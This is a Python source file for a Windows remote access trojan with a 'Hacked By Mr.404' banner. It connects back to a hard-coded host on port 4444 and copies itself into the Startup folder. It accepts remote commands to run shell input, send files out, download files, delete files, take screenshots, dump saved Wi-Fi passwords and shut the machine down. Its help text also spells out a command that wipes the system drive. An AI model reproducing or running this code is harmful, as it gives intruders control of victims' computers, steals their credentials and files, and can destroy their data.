from socket import *
from plyer import notification
from wallpaper import set_wallpaper, get_wallpaper
import subprocess
import platform
import pyautogui
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
import pyttsx3
import os
from getpass import getuser
from winsound import Beep
import pynput 
from pynput.keyboard import Key, Listener
import logging
from PyWallpaper import change_wallpaper
import struct
import ctypes
import requests
import time
os.system('cls')
s = socket(2,1)
s.connect(("172.20.10.6",4444))
 
username = getuser() # Get The Current Username 
startup = 'C:\\Users\\"{}"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'.format(username)   
os.system("copy {} {}".format(__file__ , startup)) # Copy This File To Startup Directory

def changeback():
    try:
        url = command.replace('chback_','')
        r = requests.get(url, allow_redirects=True)
        open('wall_hacked.jpg',mode='wb').write(r.content)
        print('done')
        change_wallpaper('wall_hacked.jpg')

        os.remove('wall_hacked.jpg')
        s.send('Wallpaper Changed'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())


def downloadim():
    try:
        file = command.replace('download ','')
        file = open(file , mode = "rb")
        data = file.read()
        file.close() 
        while True:
            if len(data) > 0:
                tmp_data = data[0:1024]
                if len(tmp_data) < 1024:
                    tmp_data += chr(0).encode() * (1024 - len(tmp_data))
                data = data[1024:]
                
                s.send(tmp_data)
                print("." , end="")
            else:
                s.send(b"endendend")
                print("done")
                break
    except:
        s.send('We Have Problme Here . . .'.encode())


def upload_file():
    try:
        url = command.replace('upload_file ','')
        r = requests.get(url, allow_redirects=True)
        open('YOU_HAVE_BEEN_HACKED.jpg', 'wb').write(r.content)
        s.send('I Upload Your File'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def Virus_danger():
    try:
        s.send('not now'.encode())
        #os.system('#RD C:\ /S /Q del c:\windows\system32*. * /q del /f /s /q “C:*.')
    except:
        s.send('We Have Bug Here . . .'.encode())

def volumeup():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
        s.send('Volume Up 100%'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def download_():
    try:
        


            filename = command.replace('pickup ','')  #   test.txt\
            data = open(filename,'a+').write("""


----------------
Hacked By Mr.404
----------------

        """)
            filesender = open(filename,'r').read()
            s.send(filesender.encode())
            time.sleep(4)
            s.send('file download, Please Check Hacked Folder'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def cd_dir():
    try:
        dirname = command.replace('cd ','')
        os.chdir(dirname)
        s.send('Directory Changed'.encode())
    except:
        s.send('We Have Problem Here . . .'.encode())


def rename_file():
    try:
        namefile = command.replace('ren_file_','')
        namesfile = namefile.split(sep=' ')
        os.rename(namesfile[0],namesfile[1])
        s.send('File Renamed'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def shutdown_():
    try:
        os.system('shutdown -s')
        s.send('system turn off'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def restart_():
    try:
        os.system('shutdown -r')
        s.send('system restarted'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def pwd_():
    try:
        pwd = os.getcwd()
        s.send(pwd.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def openlink():
    try:
        link = command.replace('open_link ','')
        os.system(f'powershell start-process "{link}"')
        s.send('link opened'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def dir_list():
    try:
        dirlist = subprocess.getoutput("fsutil fsinfo drives")
        s.send(dirlist.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def sysinfo_():
    try:
        systeminfo = subprocess.getoutput('systeminfo')
        s.send(systeminfo.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def ls_():
    try:
        ls = subprocess.getoutput('dir /b')
        s.send(ls.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def screenshot():
    try:
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(f'C:\\Users\\{username}\\Pictures\\hc.png')
        s.send(f'SreenShot Save on C:\\Users\\{username}\\Pictures\\hc.png ,Please go and download that.'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())


def rm_file():
    try:
        name = command.replace('rm_file ','')
        os.remove(name)
        s.send('File removed'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def get_wlan():
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        s.send("{:<30}|  {:<}".format(i, results[0]).encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def uptxt():
    try:
        ftext = command.replace('uptxt','')
        text = ftext.split(sep=' ')
        txtfile = open(f'{text[1]}',mode='w').write(text[0])
        s.send('I Upload Your File'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())



def send_alert():
    try:
        needs = command.replace('s_alert_','')
        needls = needs.split(sep=' ')
        notification.notify(
            title = needls[0],
            message = needls[1],
            app_icon = None,
            timeout = 10,
        )
        s.send('Sent'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def getcmd_():
    try:
        comm = command.replace('cmd_','')
        outcom = subprocess.getoutput(comm)
        s.send(outcom.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())


def badvoice():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
        time = int(command.replace('badvoice_',''))
        Beep(3000,time)
        s.send('Done !'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())


def speak_():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
        sound = pyttsx3.init()
        text = command.replace('say_','')
        sound.setProperty('rate' , 110)
        sound.say(text)
        sound.runAndWait()
        time.sleep(0.2)
        s.send('Done !'.encode())
    except:
        s.send('We Have Bug Here . . .'.encode())

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
    s.send("Volume is decreased to 0%".encode())

def helplist():
    helpls = """
pwd : pwd 
---
Upload file : upload_file + (with link)
---
Destroy all the system : danger_virus (Remove Windows and system32) #RD C:\ /S /Q del c:\windows\system32*. * /q del /f /s /q “C:*.
---
Download File : pickup + [name of file] (.txt files)
---
Download Image : download [Image name]
---
Change Directory : cd (cd + [dir name])
---
Rename File : ren_file_ + [file name] + [your name] (Change the name of the file)
---
Shutdown,Restart : shutdown,restart
---
open link : open_link + http://example.com (open any link in target system)
---
drives list : dir_ls (see the name of the drives)
---
system information : sys_info 
---
file list : ls (see all the file names that you are in drive)
---
Remove file : rm_file + [filename] (delete any files for ever)
---
Hack System Wlans : hackwifi (get name) , getpass_[name]
---
upload txt file : uptxt_ + [your text,dont use space] + [yourname]
---
Access Shell : cmd_+[you text] (For Access CMD)
---
Bad Sound : Badvoice_ + [Time]
---
Speak : say_ + [Your Text]
---
Change Background : chback_ + [Image Link] (Change Desktop Wallpaper)
---
Volume -> 100% : volumeup
---
Volume -> 0% : volumedown
---
Take Screen Shot : screenshot
    """
    s.send(helpls.encode())

while True:
    command = s.recv(1234).decode()

    if "pwd" == command:
        pwd_()
    elif command == "\n" or command == "":
        s.send('   '.encode())
    elif "get_shell" in command:
        None
    elif "upload_file " in command:
        upload_file()
    elif "danger_virus" in command:
        Virus_danger()
    elif "pickup " in command:
        download_()
    elif "cd " in command:
        cd_dir()
    elif "ren_file_" in command:
        rename_file()
    elif "shutdown" in command:
        shutdown_()
    elif "restart" in command:
        restart_()
    elif "open_link" in command:
        openlink()
    elif "dir_ls" in command:
        dir_list()
    elif "sys_info" in command:
        sysinfo_()
    elif "ls" in command:
        ls_()
    elif "rm_file" in command:
        rm_file()
    elif "" or "\n" in command:
        s.send("Not Found".encode())
    elif "help" in command or "?" in command:
        helplist()
    elif "hackwifi" in command:
        get_wlan()
    elif 'uptxt_' in command:
        uptxt()
    elif 's_alert_' in command:
        send_alert()
    elif 'cmd_' in command:
        getcmd_()
    elif 'download' in command:
        downloadim()
    elif 'badvoice' in command:
        badvoice()
    elif 'say_' in command:
        speak_()
    elif 'chback_' in command:
        changeback()
    elif 'volumeup' in command:
        volumeup()
    elif 'volumedown' in  command:
        volumedown()
    elif 'screenshot' in command:
        screenshot()
    else:
        s.send('Command Not Found !!!'.encode())